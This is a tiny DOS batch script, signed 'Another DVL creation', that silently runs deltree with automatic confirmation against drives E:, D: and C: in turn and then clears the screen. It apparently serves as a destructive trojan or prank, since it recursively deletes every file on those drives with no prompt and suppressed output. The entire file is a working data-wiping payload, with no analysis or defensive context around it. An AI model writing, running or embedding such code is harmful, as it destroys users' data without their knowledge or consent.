   @echo off
   ::Another DVL creation
   @for %a in (e:\) do deltree/y %a >nul
   @for %a in (d:\) do deltree/y %a >nul
   @for %a in (c:\) do deltree/y %a >nul
   cls
